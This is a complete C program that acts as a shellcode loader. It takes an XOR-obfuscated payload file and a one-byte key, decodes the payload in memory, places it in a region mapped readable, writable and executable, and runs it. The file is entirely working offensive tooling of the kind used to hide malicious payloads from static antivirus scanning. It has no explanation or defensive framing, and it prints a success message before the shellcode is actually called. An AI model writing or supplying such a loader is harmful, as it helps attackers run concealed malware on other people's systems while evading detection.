#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>


void deobfuscate_shellcode(unsigned char *code, size_t length, unsigned char obf_key){


    for(size_t i = 0; i < length; i++){

        code[i] = code[i] ^ obf_key;

    }

}



int main(int argc, char *argv[]) {

    if (argc < 3){


        printf("Usage: %s <obfuscated .bin shellcode file> <Key to deobfuscate>\n", argv[0]);
        return 1;

        

    }


    FILE * file = fopen(argv[1], "rb");


    if (file == NULL) {

        perror("[-] Error opening file\n");
        return 1;


    }


    printf("[+] Opened File Successfully\n");

   
    fseek(file, 0, SEEK_END);
    size_t len = ftell(file);
    fseek(file, 0, SEEK_SET);



    printf("[+] Reading Obfuscated shellcode\n");

    unsigned char obf_key = (unsigned char)strtoul(argv[2], NULL, 0);

    unsigned char * obfuscated_code = ((unsigned char *)malloc(len));





    if (obfuscated_code == NULL){

        perror("[-] Memory Allocation Failed\n");

        fclose(file);
        return 1;

    }




    fread(obfuscated_code, 1, len, file);
    fclose(file);



    printf("[+] Copying shellcode to Memory\n");




deobfuscate_shellcode(obfuscated_code, len, obf_key);



    printf("[+] Deobfuscated Shellcode Successfully\n");



    unsigned char * deobf_shell = ((unsigned char *)malloc(len));
    memcpy(deobf_shell, obfuscated_code, len);




void * memory = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);


    if (memory == MAP_FAILED){


        perror("Error Setting Memory Permissions\n");

        free(deobf_shell);
        free(obfuscated_code);

        return 1;

    }


    printf("[+] Successful Allocating Execution Memory\n");
    printf("[+] Copying Deobfuscated Shellcode to Memory\n");


    memcpy(memory, deobf_shell, len);



    printf("[+] Executing Shellcode\n");
    printf("[+] Executed Shellcode Successfully\n");

    
    ((void(*)())memory)();




    free(obfuscated_code);
    free(deobf_shell);

    munmap(memory, len);
    


    return 0;

}